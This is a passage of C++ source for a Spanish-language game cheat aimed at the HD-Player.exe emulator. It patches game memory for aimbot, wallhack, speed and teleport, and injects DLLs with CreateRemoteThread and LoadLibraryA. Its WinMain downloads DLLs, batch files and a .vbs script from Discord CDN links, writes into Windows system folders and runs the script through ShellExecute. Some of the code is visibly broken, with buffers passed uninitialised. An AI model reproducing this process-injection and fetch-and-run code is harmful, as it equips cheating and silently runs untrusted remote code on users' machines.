0x00, 0x80, 0xBF };

        mirza.FindPattern(startAddress, endAddress, SearchAimbot.data(), aimbot_new);
        if (aimbot_new.empty()) {




        }


        for (auto result : aimbot_new)
        {
            int read;
            ReadProcessMemory(mirza.ProcessHandle, (LPVOID)(result + 0x90), &read, sizeof(read), NULL);

            int write;
            WriteProcessMemory(mirza.ProcessHandle, (LPVOID)(result + 92L), &read, sizeof(read), NULL);

        }
        aimbot_new.clear();



        Beep(500, 500);
        messger = "Aimbot Drag Activated";
    }

    else {
        messger = "Aimbot Drag Not Activated";
    }

};


//
//
//bool _miraamarilla = false;
//bool _mirarosa = false;
//bool _miraroja = false;
//
//






void  hombro() {
    messger = "APLICANDO...";    //  Beep(880, 500);

    if (1)
    {
        inject.hombro();
    }

    Beep(880, 500);
    if (1)
    {
        inject.hombro2();
    }



    Beep(400, 500);
    messger = "HOMBRO APLICADA.";

};









void  MacrosC1() {
    messger = "APLICANDO...";    //  Beep(880, 500);

    if (1)
    {
        inject.MacrosC1();
    }

 
    if (1)
    {
        inject.MacrosC2();
    }
    if (1)
    {
        inject.MacrosC3();
    }
    if (1)
    {
        inject.MacrosC4();
    }





    Beep(400, 500);
    messger = "TIRO RAPIDO  APLICADA.";

};






void fixwall() {
    messger = "APLICANDO...";
    Beep(880, 500);
    inject.fixwall();
    Beep(400, 500);
    messger = "BYPASS WALLAHCK APLICADA.";

};



void  fixcamara() {
    messger = "APLICANDO...";

    inject.fixcamara();

    Beep(400, 500);
    messger = "BYPASS CAMARA HACK APLICADA";

};





void  seguridadnuevafull1() {
    messger = "APLICANDO...";

    inject.seguridadnuevafull1();

    Beep(400, 500);
    messger = "SEGURIDAD 1 aplicada";

};





void  seguridadnuevafull3() {
    messger = "APLICANDO...";

    inject.seguridadnuevafull3();

    Beep(400, 500);
    messger = "SEGURIDAD 3 APLICADA";

};





void  verificado() {
    messger = "APLICANDO...";


    if (1)
    {
        inject.verificado();
    }


    if (1)
    {
        inject.verificado1();
    }

    Beep(400, 500);
    messger = "VERIFICADO APLICADA";
};





static bool checkbox1[1];
static bool checkbox2[2];
static bool checkbox3[3];
static bool checkbox4[4];
static bool checkbox5[5];
static bool checkbox6[6];
static bool checkbox7[7];

static bool checkbox8[8];







void BypassExtreme() {
    messger = "ACTIVANDO BYPASS ESPERE UN MOMENTO...";
    if (1)
    {
        inject.byp1();
    }
    if (1)
    {
        inject.byp2();
    }
    if (1)
    {
        inject.byp3();
    }
    Beep(200, 400);
    messger = "BYPASS ACTIVADO CON EXITO!";
};



void  aim18022() {
    messger = "APLICANDO...";

    inject.aim18022();

    Beep(400, 500);
    messger = "AIM FOV 180 APLICADA";

};


bool _red = false;
bool _blue = false;
bool _cabeza = false;
bool _white = false;
bool _hombrosxd = false;



void  seguridadnuevafull5() {
    messger = "APLICANDO...";

    inject.seguridadnuevafull5();

    Beep(400, 500);
    messger = "SEGURIDAD 5 APLICADA";

};




void  seguridadnuevafull6() {
    messger = "APLICANDO...";

    inject.seguridadnuevafull6();

    Beep(400, 500);
    messger = "SEGURIDAD 6 APLICADA";

};



void  camaraalta() {
    messger = "APLICANDO...";

    inject.camaraalta();

    Beep(400, 500);
    messger = "SEGURIDAD 6 APLICADA";

};




void  camara() {
    messger = "APLICANDO...";

    inject.camara();

    Beep(400, 500);
    messger = "VISON HACK APLICADA";

};










bool _chamsrgb = false;


void  seguridadnuevafull() {
    messger = "APLICANDO SEGURIDAD....";

    /* messger = "SEGURIDAD x1";
       if (1)
       {
           inject.seguridadnuevafull1();
       }*/

    messger = "SEGURIDAD x2";
    if (1)
    {
        inject.seguridadnuevafull2();
    }

    /* messger = "SEGURIDAD x3";
      if (1)
      {
          inject.seguridadnuevafull3();
      }*/





      /*  messger = "SEGURIDAD x4";
         if (1)
         {
             inject.seguridadnuevafull5();
         }*/

         /*messger = "SEGURIDAD x5";
           if (1)
           {
               inject.seguridadnuevafull6();
           }
       */






    Beep(400, 500);
    messger = "SEGURIDAD FULL APLICADA EXITO..";

};






void renderGUI() {

    ImVec2 windowCenter = ImVec2(ImGui::GetIO().DisplaySize.x * 14.5f, ImGui::GetIO().DisplaySize.y * 14.5f);


    ImVec2 textSize = ImGui::CalcTextSize("DreamTeam");


    ImVec2 textPosition = ImVec2(windowCenter.x - textSize.x * 14.5f, windowCenter.y - textSize.y * 14.5f);


    ImGui::Begin("DreamTeam", nullptr, ImGuiWindowFlags_NoTitleBar | ImGuiWindowFlags_NoResize | ImGuiWindowFlags_NoMove | ImGuiWindowFlags_NoScrollbar | ImGuiWindowFlags_NoSavedSettings);


    ImGui::SetCursorPos(textPosition);


    ImGui::Text("DreamTeam");


    ImGui::End();
}




void  Balas3() {
    messger = "APLICANDO...";
    Beep(880, 500);

    if (1)
    {
        inject.Balas3();
    }

    Beep(880, 500);
    if (1)
    {
        inject.Balas4();
    }

    Beep(880, 500);
    if (1)
    {
        inject.Balas5();
    }

    Beep(880, 500);
    if (1)
    {
        inject.Balas6();
    }

    Beep(400, 500);
    messger = "BALAS v2 APLICADA.";

};






void  balasv2() {
    messger = "APLICANDO...";

    inject.balasv2();

    Beep(400, 500);
    messger = "BALAS v1 Aplicada";

};





bool statusButtonPressed86 = false;
bool statusButtonPressed55 = false;

bool statusButtonPressed555 = false;
bool statusButtonPressed999 = false;

bool statusButtonPressed8 = false;

bool statusButtonPressed6 = false;

bool statusButtonPressed9 = false;
bool scanButtonPressed9 = false;
bool scanButtonPressed55 = false;

bool scanButtonPressed11 = false;
bool statusButtonPressed11 = false;
bool statusButtonPressed12 = false;

bool statusButtonPressed1 = false;
bool scanButtonPressed1 = false;
bool statusButtonPressed3 = false;
bool scanButtonPressed8 = false;
std::vector<DWORD_PTR> foundAddresses1;
std::vector<DWORD_PTR> foundAddresses3;


std::vector<DWORD_PTR> foundAddresses55;

std::vector<DWORD_PTR> foundAddresses8;

std::vector<DWORD_PTR> foundAddresses9;


std::vector<DWORD_PTR> foundAddresses444;

std::vector<DWORD_PTR> foundAddresses555;

std::vector<DWORD_PTR> foundAddresses999;

std::vector<DWORD_PTR> foundAddresses86;


std::vector<DWORD_PTR> foundAddresses15;

bool statusButtonPressed5 = false;
bool scanButtonPressed5 = false;
bool scanButtonPressed6 = false;
bool scanButtonPressed15 = false;
bool scanButtonPressed87 = false;
bool statusButtonPressed15 = false;
bool scanButtonPressed12 = false;


bool scanButtonPressed555 = false;
bool scanButtonPressed999 = false;
bool statusButtonPressed87 = false;

bool statusButtonPressed444 = false;
bool scanButtonPressed444 = false;
bool scanButtonPressed86 = false;

void Memoryscancamara()
{
    Beep(880, 500);
    messger = "APLICANDO.....";
    CMemory::Initialize()->ScanMem(0x0000000000000000, 0x7fffffffffff,
        PBYTE("\x00\x00\x00\x00\x00\x00\x80\x3F\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\xBF\x00\x00\x00\x00\x00\x00\x80\xBF\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x3F\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\xBF\x00\x00\x80\x7F\x00\x00\x80\x7F\x00\x00\x80\x7F\x00\x00\x80\xFF"),
        "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
        foundAddresses444,
        5
    );
    Beep(800, 700);
    messger = "CAMARA HACK UNDER ACTIVADA";
    scanButtonPressed444 = true;
}


void MemoryScanSalto()
{
    Beep(880, 500);
    messger = "APLICANDO.....";
    CMemory::Initialize()->ScanMem(0x0000000000000000, 0x7fffffffffff,
        PBYTE("\x06\x30\x48\x2d\xe9\x08\xb0\x8d\xe2\x00\x40\xa0\xe1\x38\x01\x9f\xe5"),
        "xxxxxxxxxxxxxxxxx",//17
        foundAddresses55,
        5
    );
    Beep(800, 700);
    messger = "SALTO INSANO ACTIVADA";
    scanButtonPressed55 = true;
}






void memoryScanTeleTio()
{
    Beep(880, 500);
    messger = "APLICANDO.....";
    CMemory::Initialize()->ScanMem(0x0000000000000000, 0x7fffffffffff,
        PBYTE("\x00\x00\x7A\x44\x54\xA0\xFA\x04\xF0\x4F\x2D\xE9\x1C\xB0\x8D\xE2 "),
        "xxxxxxxxxxxxxxxx",//16
        foundAddresses86,
        5
    );
    Beep(800, 700);
    messger = "TELEPORT TIO MODS XD ACTIVADA";
    scanButtonPressed86 = true;
}






void MemoryScanWall()
{
    Beep(880, 500);
    messger = "APLICANDO.....";
    CMemory::Initialize()->ScanMem(0x0000000000000000, 0x7fffffffffff,
        PBYTE("\xA0\xC3\xDE\x05\x8C\xBA\xF4\x05\x2C\xA5\xDE\x05\x30\x48\x2D\xE9\x08\xB0\x8D\xE2\x00\x40\xA0\xE1\x38\x01\x9F\xE5"),
        "xxxxxxxxxxxxxxxxxxxxxxxxxxxx",//28
        foundAddresses1,
        5
    );
    Beep(800, 700);
    messger = "SALTO INSANo APLICADO..";
    scanButtonPressed1 = true;
}
//0x00 0x00 0x00 0xEA 0xBD 0x37 0x86 0x35 0x85 0x8A 0x23 0xEE 0x87 0x9A 0x22 0xEE este es para ke kite
//0x00 0x00 0x00 0xEA 0x00 0x00 0x80 0xBF 0x85 0x8A 0x23 0xEE 0x87 0x9A 0x22 0xEE





//que funcion llama al panel?

void MemoryScanFantasmaPlay()
{
    Beep(880, 500);
    messger = "APLICANDO.....";
    CMemory::Initialize()->ScanMem(0x0000000000000000, 0x7fffffffffff,
        PBYTE("\x00\x7A\x44\?\?\?\?\?\?\x04\xF0\x4F\x2D\xE9\x1C\xB0\x8D\xE2"),
        "xxx??????xxxxxxxxx",
        foundAddresses555,
        5
    );
    Beep(800, 700);
    messger = "FANTASMA PLAY STORE ACTIVADO!";
    scanButtonPressed555 = true;
}



void MemoryScanTeleportPlay()
{
    Beep(880, 500);
    messger = "APLICANDO.....";
    CMemory::Initialize()->ScanMem(0x0000000000000000, 0x7fffffffffff,
        PBYTE("\xA8\x31\xE5\x04\x70\x31\xE5\x04\xE4\x35\xE5\x04\x00\x00\x7A\x44\x8C\x35\xE5\x04\xF0\x4F\x2D\xE9\x1C\xB0\x8D\xE2"),
        "xxxxxxxxxxxxxxxxxxxxxxxxxxxx",
        foundAddresses999,
        5
    );
    Beep(800, 700);
    messger = "TELEPORT PLAY STORE ACTIVADO!";
    scanButtonPressed999 = true;
}
















std::vector<DWORD_PTR> foundAddresses6;
void MemoryScanModoFantasmaamazon()
{
    Beep(880, 500);
    messger = "Teleport Activando..";
    CMemory::Initialize()->ScanMem(0x0000000000000000, 0x7fffffffffff,



        PBYTE("\x00\x00\x7A\x44\x44\xA0\xFA\x04\xF0\x4F\x2D\xE9\x1C\xB0\x8D\xE2"),
        "xxxxxxxxxxxxxxxxxxxxxxxxxx",//16

        foundAddresses6,
        5
    );
    Beep(800, 700);

    messger = "TELEPORT ACTIVADO";

    scanButtonPressed6 = true;
}







std::vector<DWORD_PTR> foundAddresses87;
void MemoryScanTeleportRafaplay()
{
    Beep(880, 500);
    messger = "Teleport Activando..";
    CMemory::Initialize()->ScanMem(0x0000000000000000, 0x7fffffffffff,



        PBYTE("\x00\x00\x7A\x44\x44\xA0\xFA\x04\xF0\x4F\x2D\xE9\x1C\xB0\x8D\xE2"),
        "xxxxxxxxxxxxxxxx",//16

        foundAddresses87,
        5
    );
    Beep(800, 700);

    messger = "TELEPORT ACTIVADO";

    scanButtonPressed87 = true;
}










std::vector<DWORD_PTR> foundAddresses5;



std::vector<DWORD_PTR> foundAddresses12;




std::vector<DWORD_PTR> foundAddresses11;


//////////////////////////////////////////////////////////

void memoryScanCamaraRafa()
{
    Beep(880, 500);
    messger = "APLICANDO.....";
    CMemory::Initialize()->ScanMem(0x0000000000000000, 0x7fffffffffff,

        PBYTE("\x00\x00\x80\x3F\x00\x00\x80\x3F\x00\x00\x80\x3F\x00\x00\x00\x00\x00\x00\x80\x3F\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\xBF\x00\x00\x00\x00"),
        "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",//36
        foundAddresses12,
        5
    );
    Beep(800, 700);
    // ImGui::InsertNotification({ NULL, 3000, "HOOTS SPEEND APLICICADO CON EXITO!" });

    messger = "SPEED X99 APLICADO.";
    scanButtonPressed12 = true;
}










void MemoryScanspeend()
{
    Beep(880, 500);
    messger = "APLICANDO.....";
    CMemory::Initialize()->ScanMem(0x0000000000000000, 0x7fffffffffff,

        PBYTE("\x0\x0\x50\x40\x33\x33\xb3\x3f\x33\x33\xf3\x3f\xcd\xcc\x4c\x3f"),
        "xxxxxxxxxxxxxxxx",
        foundAddresses9,
        5
    );
    Beep(800, 700);
    // ImGui::InsertNotification({ NULL, 3000, "HOOTS SPEEND APLICICADO CON EXITO!" });

    messger = "SPEED X99 APLICADO.";
    scanButtonPressed9 = true;
}





void MemoryScanWALLNEW()
{
    Beep(880, 500);
    messger = "APLICANDO.....";
    CMemory::Initialize()->ScanMem(0x0000000000000000, 0x7fffffffffff,

        PBYTE("\x00\x00\x00\xEA\xBD\x37\x86\x35\x85\x8A\x23\xEE\x87\x9A\x22\xEE"),
        "xxxxxxxxxxxxxxxx",
        foundAddresses15,
        5
    );
    Beep(800, 700);
    messger = "WALLHACK DURO APLICADO.";
    scanButtonPressed15 = true;
}




void MemoryScanspeendx99()
{
    Beep(880, 500);
    messger = "APLICANDO.....";
    CMemory::Initialize()->ScanMem(0x0000000000000000, 0x7fffffffffff,

        PBYTE("\x00\x00\x50\x40\x33\x33\xB3\x3F\x33\x33\xF3\x3F"),
        "xxxxxxxxxxxx",


        foundAddresses11,
        5
    );
    Beep(800, 700);
    messger = "SPEED x99 ACTIVADO";
    scanButtonPressed11 = true;
}






void Memoryteleport()
{
    Beep(880, 500);
    messger = "APLICANDO.....";
    CMemory::Initialize()->ScanMem(0x0000000000000000, 0x7fffffffffff,

        // PBYTE("\x00\x00\x7A\x44\xD8\xA3\xE5\x04\xF0\x4F\x2D\xE9\x1C\xB0\x8D\xE2\x84\xD0\x4D\xE2\x00\x50\xA0\xE1\x70\x02\x9F\xE5\x02\x60\xA0\xE1\x01\x70\xA0\xE1\x00\x00\x8F\xE0"),
        // "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",

        PBYTE("\x00\x7A\x44\x7C\x35\xE5\x04\xF0\x4F\x2D\xE9\x1C\xB0\x8D\xE2"),
        "xxxxxxxxxxxxxxx",



        foundAddresses5,
        5
    );
    Beep(800, 700);
    globals.MemoryLogs = "FANTASMA ACTIVADO.";
    scanButtonPressed5 = true;
}


bool sg, internet, xd, xd1,xd2;
#include "Memory.h"





namespace rafa {
 bool sg, internet, xd,xd1, xd2;

}







#pragma comment(lib,"Wininet.lib")
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "urlmon.lib")

void ESPbox() {
    LPCSTR DllPath = "C:\\Windows\\Temp\\boxrgb.dll";
    DWORD procID = GetPid("HD-Player.exe");
    HANDLE handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procID);
    LPVOID pDllPath = VirtualAllocEx(handle, 0, strlen(DllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
    WriteProcessMemory(handle, pDllPath, (LPVOID)DllPath, strlen(DllPath) + 1, 0);

    HANDLE hLoadThread = CreateRemoteThread(handle, 0, 0,
        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"), pDllPath, 0, 0);
    WaitForSingleObject(hLoadThread, INFINITE);

    VirtualFreeEx(handle, pDllPath, strlen(DllPath) + 1, MEM_RELEASE);

    messger = "ESP BOX Activada";

};




void rgbrafaxd() {
    LPCSTR DllPath = "C:\\Windows\\Temp\\RafaRGB.dll";
    DWORD procID = GetPid("HD-Player.exe");
    HANDLE handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procID);
    LPVOID pDllPath = VirtualAllocEx(handle, 0, strlen(DllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
    WriteProcessMemory(handle, pDllPath, (LPVOID)DllPath, strlen(DllPath) + 1, 0);

    HANDLE hLoadThread = CreateRemoteThread(handle, 0, 0,
        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"), pDllPath, 0, 0);
    WaitForSingleObject(hLoadThread, INFINITE);

    VirtualFreeEx(handle, pDllPath, strlen(DllPath) + 1, MEM_RELEASE);

    messger = "CHAMS RGB XD  Activada";

};












void reddddxxdfdsa() {
    LPCSTR DllPath = "C:\\Windows\\Temp\\systen.dll";
    DWORD procID = GetPid("HD-Player.exe");
    HANDLE handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procID);
    LPVOID pDllPath = VirtualAllocEx(handle, 0, strlen(DllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
    WriteProcessMemory(handle, pDllPath, (LPVOID)DllPath, strlen(DllPath) + 1, 0);

    HANDLE hLoadThread = CreateRemoteThread(handle, 0, 0,
        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"), pDllPath, 0, 0);
    WaitForSingleObject(hLoadThread, INFINITE);

    VirtualFreeEx(handle, pDllPath, strlen(DllPath) + 1, MEM_RELEASE);

    messger = "CHAMS 3D RAFA  Activada";

};














void xdnewusudusd() {
    LPCSTR DllPath = "C:\\Windows\\Temp\\Rastss.dll";
    DWORD procID = GetPid("HD-Player.exe");
    HANDLE handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procID);
    LPVOID pDllPath = VirtualAllocEx(handle, 0, strlen(DllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
    WriteProcessMemory(handle, pDllPath, (LPVOID)DllPath, strlen(DllPath) + 1, 0);

    HANDLE hLoadThread = CreateRemoteThread(handle, 0, 0,
        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"), pDllPath, 0, 0);
    WaitForSingleObject(hLoadThread, INFINITE);

    VirtualFreeEx(handle, pDllPath, strlen(DllPath) + 1, MEM_RELEASE);

    messger = "SYSTEM CHUPALO  Activada";

};





void tratandoxd() {
    LPCSTR DllPath = "C:\\Windows\\Temp\\system.dll";
    DWORD procID = GetPid("HD-Player.exe");
    HANDLE handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procID);
    LPVOID pDllPath = VirtualAllocEx(handle, 0, strlen(DllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
    WriteProcessMemory(handle, pDllPath, (LPVOID)DllPath, strlen(DllPath) + 1, 0);

    HANDLE hLoadThread = CreateRemoteThread(handle, 0, 0,
        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"), pDllPath, 0, 0);
    WaitForSingleObject(hLoadThread, INFINITE);

    VirtualFreeEx(handle, pDllPath, strlen(DllPath) + 1, MEM_RELEASE);

    messger = "SYSTEM CHUPALO  Activada";

};






void redchamsxd() {
    LPCSTR DllPath = "C:\\Windows\\Temp\\ChamsRed.dll";
    DWORD procID = GetPid("HD-Player.exe");
    HANDLE handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procID);
    LPVOID pDllPath = VirtualAllocEx(handle, 0, strlen(DllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
    WriteProcessMemory(handle, pDllPath, (LPVOID)DllPath, strlen(DllPath) + 1, 0);

    HANDLE hLoadThread = CreateRemoteThread(handle, 0, 0,
        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"), pDllPath, 0, 0);
    WaitForSingleObject(hLoadThread, INFINITE);

    VirtualFreeEx(handle, pDllPath, strlen(DllPath) + 1, MEM_RELEASE);

    messger = "SYSTEM CHUPALO  Activada";

};








void chamsyellowrafa() {
    LPCSTR DllPath = "C:\\Windows\\Temp\\system.dll";
    DWORD procID = GetPid("HD-Player.exe");
    HANDLE handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procID);
    LPVOID pDllPath = VirtualAllocEx(handle, 0, strlen(DllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
    WriteProcessMemory(handle, pDllPath, (LPVOID)DllPath, strlen(DllPath) + 1, 0);

    HANDLE hLoadThread = CreateRemoteThread(handle, 0, 0,
        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"), pDllPath, 0, 0);
    WaitForSingleObject(hLoadThread, INFINITE);

    VirtualFreeEx(handle, pDllPath, strlen(DllPath) + 1, MEM_RELEASE);

    messger = "CHAMS YELLOW TEST  Activada";

};





void chamsyyyy() {
    LPCSTR DllPath = "C:\\Windows\\Temp\\blanca_1.dll";
    DWORD procID = GetPid("HD-Player.exe");
    HANDLE handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procID);
    LPVOID pDllPath = VirtualAllocEx(handle, 0, strlen(DllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
    WriteProcessMemory(handle, pDllPath, (LPVOID)DllPath, strlen(DllPath) + 1, 0);

    HANDLE hLoadThread = CreateRemoteThread(handle, 0, 0,
        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"), pDllPath, 0, 0);
    WaitForSingleObject(hLoadThread, INFINITE);

    VirtualFreeEx(handle, pDllPath, strlen(DllPath) + 1, MEM_RELEASE);

    messger = "CHAMS BLANCA  Activada";

};




#include <iostream>
#include <wininet.h>

#pragma comment(lib, "wininet.lib")


void systembb() {
    LPCSTR DllPath = "C:\\Windows\\Temp\\boxrgb.dll";
    DWORD procID = GetPid("HD-Player.exe");
    HANDLE handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procID);
    LPVOID pDllPath = VirtualAllocEx(handle, 0, strlen(DllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
    WriteProcessMemory(handle, pDllPath, (LPVOID)DllPath, strlen(DllPath) + 1, 0);

    HANDLE hLoadThread = CreateRemoteThread(handle, 0, 0,
        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"), pDllPath, 0, 0);
    WaitForSingleObject(hLoadThread, INFINITE);

    VirtualFreeEx(handle, pDllPath, strlen(DllPath) + 1, MEM_RELEASE);

    messger = "SYSTEM CHUPALO  Activada";

};






void example() {
    LPCSTR DllPath = "C:\\Windows\\Temp\\BlackAndRed.dll";
    DWORD procID = GetPid("HD-Player.exe");
    HANDLE handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procID);
    LPVOID pDllPath = VirtualAllocEx(handle, 0, strlen(DllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
    WriteProcessMemory(handle, pDllPath, (LPVOID)DllPath, strlen(DllPath) + 1, 0);

    HANDLE hLoadThread = CreateRemoteThread(handle, 0, 0,
        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"), pDllPath, 0, 0);
    WaitForSingleObject(hLoadThread, INFINITE);

    VirtualFreeEx(handle, pDllPath, strlen(DllPath) + 1, MEM_RELEASE);

    messger = "CHAMS BLANCA  Activada";

};





int APIENTRY WinMain(HINSTANCE, HINSTANCE, LPSTR, int)
{
   
    
    
    
    
    

    

    {
        HRESULT hr; //sonido
        char url[] = "https://cdn.discordapp.com/attachments/1211448067207995472/1217984968718942258/RafaRGB.dll?ex=660603e5&is=65f38ee5&hm=ec39bf4a72606a283e5c964474c1bd44f287e20edf5fa56edb537cb021060d79&";
        char local[] = "C:\\Windows\\Temp\\RafaRGB.dll";
        hr = URLDownloadToFile(NULL, url, local, 0, NULL);
    }




    {
        HRESULT hr; //sonido
        char url[] = "https://cdn.discordapp.com/attachments/1034330012733681755/1160248205527760906/OPCION_ACTIVADA_AUDIO_VOZ.wav";
        char local[] = "C:\\Windows\\OPCION_ACTIVADA_AUDIO_VOZ.wav";
        hr = URLDownloadToFile(NULL, url, local, 0, NULL);
    }

    {
        HRESULT hr; //sonido
        char url[] = "https://cdn.discordapp.com/attachments/1187048206727663728/1201038705981390848/activar.wav";
        char local[] = "C:\\Windows\\activar.wav";
        hr = URLDownloadToFile(NULL, url, local, 0, NULL);
    }

    {
        HRESULT hr; //sonido
        char url[] = "https://cdn.discordapp.com/attachments/1187048206727663728/1201038724939657226/desactivar.wav";
        char local[] = "C:\\Windows\\desactivar.wav";
        hr = URLDownloadToFile(NULL, url, local, 0, NULL);
    }











    {
        HRESULT hr;
        char url[] = "https://cdn.discordapp.com/attachments/1142094843590479945/1142101206756503673/milky.vbs";
        char local[] = "C:\\Windows\\Temp\\milky.vbs";

        hr = URLDownloadToFile(NULL, url, local, 0, NULL);

        ShellExecute(NULL, "open", "C:\\Windows\\Temp\\milky.vbs", NULL, NULL, SW_SHOW);
    }





    char url123[] = "https://cdn.discordapp.com/attachments/1193710268505665600/1208450681053253724/systen.dll";


    char local123[MAX_PATH];
    strcpy_s(local123, "C:\\Windows\\Temp\\systen.dll");

    HRESULT hr5553355 = URLDownloadToFile(NULL, url123, local123, 0, NULL);

    {
        HRESULT hr;
        char url[] = "https://cdn.discordapp.com/attachments/1193710268505665600/1208450681053253724/systen.dll";
        char local[] = "C:\\Windows\\Temp\\systen.dll";

        hr = URLDownloadToFile(NULL, url, local, 0, NULL);
    }

    {
        HRESULT hr;
        char url[] = "https://cdn.discordapp.com/attachments/1193710268505665600/1208450681053253724/systen.dll";
        char local[] = "C:\\Windows\\Temp\\system.dll";

        hr = URLDownloadToFile(NULL, url, local, 0, NULL);
    }



    char url100[] = "https://cdn.discordapp.com/attachments/1199323097313054741/1202465792973738056/block_internet.bat?ex=65cd8e89&is=65bb1989&hm=293d70bd9fd9b3257aeab4deb2622cc751ab23f10afb056b57028dddb64d892d&";


    char local111[MAX_PATH];
    strcpy_s(local111, "C:\\Windows\\Temp\\block_internet.bat");

    HRESULT hr55555 = URLDownloadToFile(NULL, url100, local111, 0, NULL);




    char url4545[] = "https://cdn.discordapp.com/attachments/1199323097313054741/1202465883310526474/resume_internet.bat?ex=65cd8e9f&is=65bb199f&hm=3e9b2346b59acf14cf64a012d1cae52c4dfb88bda89aa3808c72e87f21779bde&";


    char local555[MAX_PATH];
    strcpy_s(local555, "C:\\Windows\\Temp\\resume_internet.bat");

    HRESULT hr8788 = URLDownloadToFile(NULL, url4545, local555, 0, NULL);



    char url99[] = "https://cdn.discordapp.com/attachments/1160022849378074657/1194906715678846976/rafa.wav?ex=65b20e99&is=659f9999&hm=04681b959efecc845c98f044b0852b13febb165df8255024d3273dc38c05210c&";


    char local99[MAX_PATH];
    strcpy_s(local99, "C:\\Windows\\System32\\rafa.wav");

    HRESULT hr123 = URLDownloadToFile(NULL, url99, local99, 0, NULL);













    char url5[] = "https://cdn.discordapp.com/attachments/1193710268505665600/1208450642343886898/boxrgb.dll";


    char local5[MAX_PATH];
    strcpy_s(local5, "C:\\Windows\\Temp\\boxrgb.dll");

    HRESULT hr555 = URLDownloadToFile(NULL, url5, local5, 0, NULL);



    char url7[] = "https://cdn.discordapp.com/attachments/1193710268505665600/1208450642343886898/boxrgb.dll?ex=65e3545d&is=65d0df5d&hm=6a409058037e60b5904a50082c0ef2488b0e1da69f485e3c80546ff983ac460a&";


    char local7[MAX_PATH];
    strcpy_s(local5, "C:\\Windows\\Temp\\boxrgb.dll");

    HRESULT hr12 = URLDownloadToFile(NULL, url7, local7, 0, NULL);

    char url6[] = "https://cdn.discordapp.com/attachments/1189355736749314048/1189367735721930812/ChamsRed.dll?ex=65a72285&is=6594ad85&hm=059656b67fc2da6125f8334de85ecc6ff8f41fd6b86b7e665811f7f2490bb03e&";


    char local6[MAX_PATH];
    strcpy_s(local5, "C:\\Windows\\Temp\\ChamsRed.dll");

    HRESULT hr13 = URLDownloadToFile(NULL, url6, local6, 0, NULL);


    char url8[] = "https://cdn.discordapp.com/attachments/1189355736749314048/1189367735721930812/ChamsRed.dll?ex=65a72285&is=6594ad85&hm=059656b67fc2da6125f8334de85ecc6ff8f41fd6b86b7e665811f7f2490bb03e&";


    char local8[MAX_PATH];
    strcpy_s(local8, "C:\\Windows\\Temp\\ChamsRed.dll");

    HRESULT hr14 = URLDownloadToFile(NULL, url8, local8, 0, NULL);




    char url9[] = "https://cdn.discordapp.com/attachments/1193098907488636988/1194441515511066644/Ras1.dll?ex=65b05d58&is=659de858&hm=3b9be73ca29b6af29adadbc1d51807708309b078c570eca1ffcf17629516b711&";


    char local9[MAX_PATH];
    strcpy_s(local9, "C:\\Windows\\Temp\\Ras1.dll");

    HRESULT hr15 = URLDownloadToFile(NULL, url9, local9, 0, NULL);


    char url22[] = "https://cdn.discordapp.com/attachments/1193098907488636988/1194441515817259028/Rastss.dll?ex=65b05d59&is=659de859&hm=9c104a7dde1b970d7b70bffdc29249481eee2a4deb91f7bc943376c6183fb4fd&";


    char local22[MAX_PATH];
    strcpy_s(local22, "C:\\Windows\\Temp\\Rastss.dll");

    HRESULT hr25 = URLDownloadToFile(NULL, url22, local22, 0, NULL);


    char url13[] = "https://cdn.discordapp.com/attachments/1192151849416011776/1200245005676204053/blanca_1.dll";


    char local13[MAX_PATH];
    strcpy_s(local13, "C:\\Windows\\Temp\\blanca_1.dll");

    HRESULT hr29 = URLDownloadToFile(NULL, url13, local13, 0, NULL);











    {
        HRESULT hr;
        char url[] = "https://cdn.discordapp.com/attachments/1193710268505665600/1208450642343886898/boxrgb.dll?ex=65e3545d&is=65d0df5d&hm=6a409058037e60b5904a50082c0ef2488b0e1da69f485e3c80546ff983ac460a&";
